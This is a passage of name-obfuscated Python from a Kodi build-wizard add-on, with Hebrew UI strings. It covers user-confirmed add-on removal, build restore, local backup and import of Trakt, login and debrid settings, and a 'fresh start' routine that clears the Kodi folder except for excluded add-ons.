	OO0O0OO000OO00OO0 =O0OO0OOOO0OO0000O ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4646
	OO0O0OO000OO00OO0 .doModal ()#line:4647
	del OO0O0OO000OO00OO0 #line:4648
def removeAddon (O0000OO0O0OO0O0OO ,OO0OO0O0OO000OOOO ,over =False ):#line:4650
	if not over ==False :#line:4651
		OOOO0OOO0OOOO00O0 =1 #line:4652
	else :#line:4653
		OOOO0OOO0OOOO00O0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0OO0O0OO000OOOO ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,O0000OO0O0OO0O0OO ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4654
	if OOOO0OOO0OOOO00O0 ==1 :#line:4655
		OOO0000OO00O0O0OO =os .path .join (ADDONS ,O0000OO0O0OO0O0OO )#line:4656
		wiz .log ("Removing Addon %s"%O0000OO0O0OO0O0OO )#line:4657
		wiz .cleanHouse (OOO0000OO00O0O0OO )#line:4658
		xbmc .sleep (1000 )#line:4659
		try :shutil .rmtree (OOO0000OO00O0O0OO )#line:4660
		except Exception as O00O0O0000O00O0OO :wiz .log ("Error removing %s"%O0000OO0O0OO0O0OO ,xbmc .LOGNOTICE )#line:4661
		removeAddonData (O0000OO0O0OO0O0OO ,OO0OO0O0OO000OOOO ,over )#line:4662
	if over ==False :#line:4663
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,OO0OO0O0OO000OOOO ))#line:4664
def removeAddonData (O0O00O00O00O00OOO ,name =None ,over =False ):#line:4666
	if O0O00O00O00O00OOO =='all':#line:4667
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4668
			wiz .cleanHouse (ADDOND )#line:4669
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4670
	elif O0O00O00O00O00OOO =='uninstalled':#line:4671
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4672
			O00O00OOOO0OO00OO =0 #line:4673
			for O0O0OOO0O000OO0O0 in glob .glob (os .path .join (ADDOND ,'*')):#line:4674
				OO0O0OOO0OOOO0000 =O0O0OOO0O000OO0O0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4675
				if OO0O0OOO0OOOO0000 in EXCLUDES :pass #line:4676
				elif os .path .exists (os .path .join (ADDONS ,OO0O0OOO0OOOO0000 )):pass #line:4677
				else :wiz .cleanHouse (O0O0OOO0O000OO0O0 );O00O00OOOO0OO00OO +=1 ;wiz .log (O0O0OOO0O000OO0O0 );shutil .rmtree (O0O0OOO0O000OO0O0 )#line:4678
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O00O00OOOO0OO00OO ))#line:4679
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4680
	elif O0O00O00O00O00OOO =='empty':#line:4681
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4682
			O00O00OOOO0OO00OO =wiz .emptyfolder (ADDOND )#line:4683
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O00O00OOOO0OO00OO ))#line:4684
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4685
	else :#line:4686
		O0OOOO0O0O0OOO00O =os .path .join (USERDATA ,'addon_data',O0O00O00O00O00OOO )#line:4687
		if O0O00O00O00O00OOO in EXCLUDES :#line:4688
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4689
		elif os .path .exists (O0OOOO0O0O0OOO00O ):#line:4690
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0O00O00O00O00OOO ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4691
				wiz .cleanHouse (O0OOOO0O0O0OOO00O )#line:4692
				try :#line:4693
					shutil .rmtree (O0OOOO0O0O0OOO00O )#line:4694
				except :#line:4695
					wiz .log ("Error deleting: %s"%O0OOOO0O0O0OOO00O )#line:4696
			else :#line:4697
				wiz .log ('Addon data for %s was not removed'%O0O00O00O00O00OOO )#line:4698
	wiz .refresh ()#line:4699
def restoreit (OOO00O0O0O0000000 ):#line:4701
	if OOO00O0O0O0000000 =='build':#line:4702
		O0O0OO0O0O000OO00 =freshStart ('restore')#line:4703
		if O0O0OO0O0O000OO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4704
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4705
		wiz .skinToDefault ()#line:4706
	wiz .restoreLocal (OOO00O0O0O0000000 )#line:4707
def restoreextit (OOO0O00O0O00O0O0O ):#line:4709
	if OOO0O00O0O00O0O0O =='build':#line:4710
		OOO000O000OO00OOO =freshStart ('restore')#line:4711
		if OOO000O000OO00OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4712
	wiz .restoreExternal (OOO0O00O0O00O0O0O )#line:4713
def buildInfo (OO00O0O00O0OOOO0O ):#line:4715
	if wiz .workingURL (SPEEDFILE )==True :#line:4716
		if wiz .checkBuild (OO00O0O00O0OOOO0O ,'url'):#line:4717
			OO00O0O00O0OOOO0O ,OOO0OOOO0O00O0OOO ,O00OO00OO0OOOOOOO ,O0O000O00O0O0O00O ,O00000O0OO0OOO0OO ,OO0OOOOOOO0000O00 ,O0OO0000OO0OOOOOO ,O0000O0OOO00O0000 ,OOO0OOOO00O0OOOOO ,OO0O0O000000OOOO0 ,O00O000OOO0O0O000 =wiz .checkBuild (OO00O0O00O0OOOO0O ,'all')#line:4718
			OO0O0O000000OOOO0 ='Yes'if OO0O0O000000OOOO0 .lower ()=='yes'else 'No'#line:4719
			OOOOOO0OO00O0OOO0 ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO00O0O00O0OOOO0O )#line:4720
			OOOOOO0OO00O0OOO0 +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO0OOOO0O00O0OOO )#line:4721
			if not OO0OOOOOOO0000O00 =="http://":#line:4722
				OO0O0000OO00000OO =wiz .themeCount (OO00O0O00O0OOOO0O ,False )#line:4723
				OOOOOO0OO00O0OOO0 +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (OO0O0000OO00000OO ))#line:4724
			OOOOOO0OO00O0OOO0 +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00000O0OO0OOO0OO )#line:4725
			OOOOOO0OO00O0OOO0 +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0O0O000000OOOO0 )#line:4726
			OOOOOO0OO00O0OOO0 +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00O000OOO0O0O000 )#line:4727
			wiz .TextBox (ADDONTITLE ,OOOOOO0OO00O0OOO0 )#line:4728
		else :wiz .log ("Invalid Build Name!")#line:4729
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4730
def buildVideo (OO0O00OO0O0OOO0OO ):#line:4732
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4733
	if wiz .workingURL (SPEEDFILE )==True :#line:4734
		O000OOO00000O0000 =wiz .checkBuild (OO0O00OO0O0OOO0OO ,'preview')#line:4735
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%OO0O00OO0O0OOO0OO )#line:4736
		if O000OOO00000O0000 and not O000OOO00000O0000 =='http://':playVideo (O000OOO00000O0000 )#line:4737
		else :wiz .log ("[%s]Unable to find url for video preview"%OO0O00OO0O0OOO0OO )#line:4738
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4739
def dependsList (OO00OO00O000O0O00 ):#line:4741
	OO0O00O000OO0000O =os .path .join (ADDONS ,OO00OO00O000O0O00 ,'addon.xml')#line:4742
	if os .path .exists (OO0O00O000OO0000O ):#line:4743
		OO00O00O000OO0OO0 =open (OO0O00O000OO0000O ,mode ='r');O00O0O00O0OO00OO0 =OO00O00O000OO0OO0 .read ();OO00O00O000OO0OO0 .close ();#line:4744
		OOOOOO000OOOOOOOO =wiz .parseDOM (O00O0O00O0OO00OO0 ,'import',ret ='addon')#line:4745
		OOOOOO00O0O0O0000 =[]#line:4746
		for O0O0OO0OOOO0O0O0O in OOOOOO000OOOOOOOO :#line:4747
			if not 'xbmc.python'in O0O0OO0OOOO0O0O0O :#line:4748
				OOOOOO00O0O0O0000 .append (O0O0OO0OOOO0O0O0O )#line:4749
		return OOOOOO00O0O0O0000 #line:4750
	return []#line:4751
def manageSaveData (OO00000000OOOO000 ):#line:4753
	if OO00000000OOOO000 =='import':#line:4754
		OOOOO0OO000OOOOOO =os .path .join (ADDONDATA ,'temp')#line:4755
		if not os .path .exists (OOOOO0OO000OOOOOO ):os .makedirs (OOOOO0OO000OOOOOO )#line:4756
		OOO0OOO00OOO00OOO =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4757
		if not OOO0OOO00OOO00OOO .endswith ('.zip'):#line:4758
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4759
			return #line:4760
		OOO0OOOO0O0O0O0O0 =os .path .join (MYBUILDS ,'SaveData.zip')#line:4761
		O0OO00O0O000OOO00 =xbmcvfs .copy (OOO0OOO00OOO00OOO ,OOO0OOOO0O0O0O0O0 )#line:4762
		wiz .log ("%s"%str (O0OO00O0O000OOO00 ))#line:4763
		extract .all (xbmc .translatePath (OOO0OOOO0O0O0O0O0 ),OOOOO0OO000OOOOOO )#line:4764
		OO0O0000OO00O0OOO =os .path .join (OOOOO0OO000OOOOOO ,'trakt')#line:4765
		O0O0000OOOO00O000 =os .path .join (OOOOO0OO000OOOOOO ,'login')#line:4766
		O0O0OO0OOO0OO0O00 =os .path .join (OOOOO0OO000OOOOOO ,'debrid')#line:4767
		OOOO000000O00OOOO =0 #line:4768
		if os .path .exists (OO0O0000OO00O0OOO ):#line:4769
			OOOO000000O00OOOO +=1 #line:4770
			OOO000O0O0OOOOOO0 =os .listdir (OO0O0000OO00O0OOO )#line:4771
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4772
			for O0O00OOOO00O000O0 in OOO000O0O0OOOOOO0 :#line:4773
				OOOO0O0O0O00O0O0O =os .path .join (traktit .TRAKTFOLD ,O0O00OOOO00O000O0 )#line:4774
				O000OO000O0OO0O0O =os .path .join (OO0O0000OO00O0OOO ,O0O00OOOO00O000O0 )#line:4775
				if os .path .exists (OOOO0O0O0O00O0O0O ):#line:4776
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0O00OOOO00O000O0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4777
					else :os .remove (OOOO0O0O0O00O0O0O )#line:4778
				shutil .copy (O000OO000O0OO0O0O ,OOOO0O0O0O00O0O0O )#line:4779
			traktit .importlist ('all')#line:4780
			traktit .traktIt ('restore','all')#line:4781
		if os .path .exists (O0O0000OOOO00O000 ):#line:4782
			OOOO000000O00OOOO +=1 #line:4783
			OOO000O0O0OOOOOO0 =os .listdir (O0O0000OOOO00O000 )#line:4784
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4785
			for O0O00OOOO00O000O0 in OOO000O0O0OOOOOO0 :#line:4786
				OOOO0O0O0O00O0O0O =os .path .join (loginit .LOGINFOLD ,O0O00OOOO00O000O0 )#line:4787
				O000OO000O0OO0O0O =os .path .join (O0O0000OOOO00O000 ,O0O00OOOO00O000O0 )#line:4788
				if os .path .exists (OOOO0O0O0O00O0O0O ):#line:4789
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0O00OOOO00O000O0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4790
					else :os .remove (OOOO0O0O0O00O0O0O )#line:4791
				shutil .copy (O000OO000O0OO0O0O ,OOOO0O0O0O00O0O0O )#line:4792
			loginit .importlist ('all')#line:4793
			loginit .loginIt ('restore','all')#line:4794
		if os .path .exists (O0O0OO0OOO0OO0O00 ):#line:4795
			OOOO000000O00OOOO +=1 #line:4796
			OOO000O0O0OOOOOO0 =os .listdir (O0O0OO0OOO0OO0O00 )#line:4797
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4798
			for O0O00OOOO00O000O0 in OOO000O0O0OOOOOO0 :#line:4799
				OOOO0O0O0O00O0O0O =os .path .join (debridit .REALFOLD ,O0O00OOOO00O000O0 )#line:4800
				O000OO000O0OO0O0O =os .path .join (O0O0OO0OOO0OO0O00 ,O0O00OOOO00O000O0 )#line:4801
				if os .path .exists (OOOO0O0O0O00O0O0O ):#line:4802
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0O00OOOO00O000O0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4803
					else :os .remove (OOOO0O0O0O00O0O0O )#line:4804
				shutil .copy (O000OO000O0OO0O0O ,OOOO0O0O0O00O0O0O )#line:4805
			debridit .importlist ('all')#line:4806
			debridit .debridIt ('restore','all')#line:4807
		wiz .cleanHouse (OOOOO0OO000OOOOOO )#line:4808
		wiz .removeFolder (OOOOO0OO000OOOOOO )#line:4809
		os .remove (OOO0OOOO0O0O0O0O0 )#line:4810
		if OOOO000000O00OOOO ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4811
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4812
	elif OO00000000OOOO000 =='export':#line:4813
		O00OO0O000000OO0O =xbmc .translatePath (MYBUILDS )#line:4814
		OOO0OOOOO0O0OOOO0 =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4815
		traktit .traktIt ('update','all')#line:4816
		loginit .loginIt ('update','all')#line:4817
		debridit .debridIt ('update','all')#line:4818
		OOO0OOO00OOO00OOO =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4819
		OOO0OOO00OOO00OOO =xbmc .translatePath (OOO0OOO00OOO00OOO )#line:4820
		O0O00OOOO000OO0OO =os .path .join (O00OO0O000000OO0O ,'SaveData.zip')#line:4821
		OOOOO0000O00000OO =zipfile .ZipFile (O0O00OOOO000OO0OO ,mode ='w')#line:4822
		for OOOO00O00O00OOO00 in OOO0OOOOO0O0OOOO0 :#line:4823
			if os .path .exists (OOOO00O00O00OOO00 ):#line:4824
				OOO000O0O0OOOOOO0 =os .listdir (OOOO00O00O00OOO00 )#line:4825
				for OO00O0O00000O0OOO in OOO000O0O0OOOOOO0 :#line:4826
					OOOOO0000O00000OO .write (os .path .join (OOOO00O00O00OOO00 ,OO00O0O00000O0OOO ),os .path .join (OOOO00O00O00OOO00 ,OO00O0O00000O0OOO ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4827
		OOOOO0000O00000OO .close ()#line:4828
		if OOO0OOO00OOO00OOO ==O00OO0O000000OO0O :#line:4829
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O00OOOO000OO0OO ))#line:4830
		else :#line:4831
			try :#line:4832
				xbmcvfs .copy (O0O00OOOO000OO0OO ,os .path .join (OOO0OOO00OOO00OOO ,'SaveData.zip'))#line:4833
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (OOO0OOO00OOO00OOO ,'SaveData.zip')))#line:4834
			except :#line:4835
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O00OOOO000OO0OO ))#line:4836
def freshStart (install =None ,over =False ):#line:4841
	if USERNAME =='':#line:4842
		ADDON .openSettings ()#line:4843
		sys .exit ()#line:4844
	O000O0O0O000O0O0O =(SPEEDFILE )#line:4845
	(O000O0O0O000O0O0O )#line:4846
	OOO00000OO00OOOO0 =(wiz .workingURL (O000O0O0O000O0O0O ))#line:4847
	(OOO00000OO00OOOO0 )#line:4848
	if KEEPTRAKT =='true':#line:4849
		traktit .autoUpdate ('all')#line:4850
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4851
	if KEEPREAL =='true':#line:4852
		debridit .autoUpdate ('all')#line:4853
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4854
	if KEEPLOGIN =='true':#line:4855
		loginit .autoUpdate ('all')#line:4856
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4857
	if over ==True :O0000OO0OO00O0000 =1 #line:4858
	elif install =='restore':O0000OO0OO00O0000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4859
	elif install :O0000OO0OO00O0000 =1 #line:4860
	else :O0000OO0OO00O0000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4861
	if O0000OO0OO00O0000 :#line:4862
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4863
			O0O0O00OO0O000OOO ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4864
			skinSwitch .swapSkins (O0O0O00OO0O000OOO )#line:4867
			OOO00000O00O00OO0 =0 #line:4868
			xbmc .sleep (1000 )#line:4869
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOO00000O00O00OO0 <150 :#line:4870
				OOO00000O00O00OO0 +=1 #line:4871
				xbmc .sleep (1000 )#line:4872
				wiz .ebi ('SendAction(Select)')#line:4873
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4874
				wiz .ebi ('SendClick(11)')#line:4875
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4876
			xbmc .sleep (1000 )#line:4877
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4878
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4879
			return #line:4880
		wiz .addonUpdates ('set')#line:4881
		OO00OOOO00O0OO0O0 =os .path .abspath (HOME )#line:4882
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4883
		OO0OOOO0O00O00OOO =sum ([len (OOO00O0O0OO0O0000 )for OO0OO0OOOO000O000 ,O00O00O0OO0OO00O0 ,OOO00O0O0OO0O0000 in os .walk (OO00OOOO00O0OO0O0 )]);O000O0O0OOOOOOOO0 =0 #line:4884
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4885
		EXCLUDES .append ('My_Builds')#line:4886
		EXCLUDES .append ('archive_cache')#line:4887
		EXCLUDES .append ('script.module.requests')#line:4888
		EXCLUDES .append ('myfav.anon')#line:4889
		if KEEPREPOS =='true':#line:4890
			O0OO0OOO000OOOO0O =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4891
			for OOOO0OO0OOO0OO0O0 in O0OO0OOO000OOOO0O :#line:4892
				OO0O0OOOO0OO000OO =os .path .split (OOOO0OO0OOO0OO0O0 [:-1 ])[1 ]#line:4893
				if not OO0O0OOOO0OO000OO ==EXCLUDES :#line:4894
					EXCLUDES .append (OO0O0OOOO0OO000OO )#line:4895
		if KEEPSUPER =='true':#line:4896
			EXCLUDES .append ('plugin.program.super.favourites')#line:4897
		if KEEPMOVIELIST =='true':#line:4898
			EXCLUDES .append ('plugin.video.metalliq')#line:4899
		if KEEPMOVIELIST =='true':#line:4900
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4901
		if KEEPADDONS =='true':#line:4902
			EXCLUDES .append ('addons')#line:4903
		if KEEPTELEMEDIA =='true':#line:4904
			EXCLUDES .append ('plugin.video.telemedia')#line:4905
		EXCLUDES .append ('plugin.video.elementum')#line:4910
		EXCLUDES .append ('script.elementum.burst')#line:4911
		EXCLUDES .append ('script.elementum.burst-master')#line:4912
		EXCLUDES .append ('plugin.video.quasar')#line:4913
		EXCLUDES .append ('script.quasar.burst')#line:4914
		EXCLUDES .append ('skin.estuary')#line:4915
		if KEEPWHITELIST =='true':#line:4918
			OOO00OO0OO0O0O0OO =''#line:4919
			OO000O000OOOOOO0O =wiz .whiteList ('read')#line:4920
			if len (OO000O000OOOOOO0O )>0 :#line:4921
				for OOOO0OO0OOO0OO0O0 in OO000O000OOOOOO0O :#line:4922
					try :O00OO0OO0OO0000O0 ,O000OOOOO00000OOO ,O00OOO00OOO00000O =OOOO0OO0OOO0OO0O0 #line:4923
					except :pass #line:4924
					if O00OOO00OOO00000O .startswith ('pvr'):OOO00OO0OO0O0O0OO =O000OOOOO00000OOO #line:4925
					OOOOOO00OOO0O0OOO =dependsList (O00OOO00OOO00000O )#line:4926
					for OOO000OO0O00OOO00 in OOOOOO00OOO0O0OOO :#line:4927
						if not OOO000OO0O00OOO00 in EXCLUDES :#line:4928
							EXCLUDES .append (OOO000OO0O00OOO00 )#line:4929
						OOOOO000O000OOO00 =dependsList (OOO000OO0O00OOO00 )#line:4930
						for O0OOOOO00O0O0O00O in OOOOO000O000OOO00 :#line:4931
							if not O0OOOOO00O0O0O00O in EXCLUDES :#line:4932
								EXCLUDES .append (O0OOOOO00O0O0O00O )#line:4933
					if not O00OOO00OOO00000O in EXCLUDES :#line:4934
						EXCLUDES .append (O00OOO00OOO00000O )#line:4935
				if not OOO00OO0OO0O0O0OO =='':wiz .setS ('pvrclient',O00OOO00OOO00000O )#line:4936
		if wiz .getS ('pvrclient')=='':#line:4937
			for OOOO0OO0OOO0OO0O0 in EXCLUDES :#line:4938
				if OOOO0OO0OOO0OO0O0 .startswith ('pvr'):#line:4939
					wiz .setS ('pvrclient',OOOO0OO0OOO0OO0O0 )#line:4940
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4941
		O000O0O00000O0O0O =wiz .latestDB ('Addons')#line:4942
		for O0OO0OOOO00O00000 ,O0OOOOO0OO0OOOO00 ,O0O0O00O00OOO000O in os .walk (OO00OOOO00O0OO0O0 ,topdown =True ):#line:4943
			O0OOOOO0OO0OOOO00 [:]=[O0OO000O00O0O00O0 for O0OO000O00O0O00O0 in O0OOOOO0OO0OOOO00 if O0OO000O00O0O00O0 not in EXCLUDES ]#line:4944
			for O00OO0OO0OO0000O0 in O0O0O00O00OOO000O :#line:4945
				O000O0O0OOOOOOOO0 +=1 #line:4946
				O00OOO00OOO00000O =O0OO0OOOO00O00000 .replace ('/','\\').split ('\\')#line:4947
				OOO00000O00O00OO0 =len (O00OOO00OOO00000O )-1 #line:4949
				if O00OOO00OOO00000O [OOO00000O00O00OO0 -2 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO00OOO00000O [OOO00000O00O00OO0 ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4950
				elif O00OO0OO0OO0000O0 =='MyVideos99.db'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4951
				elif O00OO0OO0OO0000O0 =='MyVideos107.db'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4952
				elif O00OO0OO0OO0000O0 =='MyVideos116.db'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4953
				elif O00OO0OO0OO0000O0 =='MyVideos99.db'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4954
				elif O00OO0OO0OO0000O0 =='MyVideos107.db'and O00OOO00OOO00000O [OOO00000O00O00OO0 -1 ]=='userdata'and O00OOO00OOO00000O [OOO00000O00O00OO0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OO0OOOO00O00000 ,O00OO0OO0OO0000O0 ),xbmc .LOGNOTICE )#line:4955
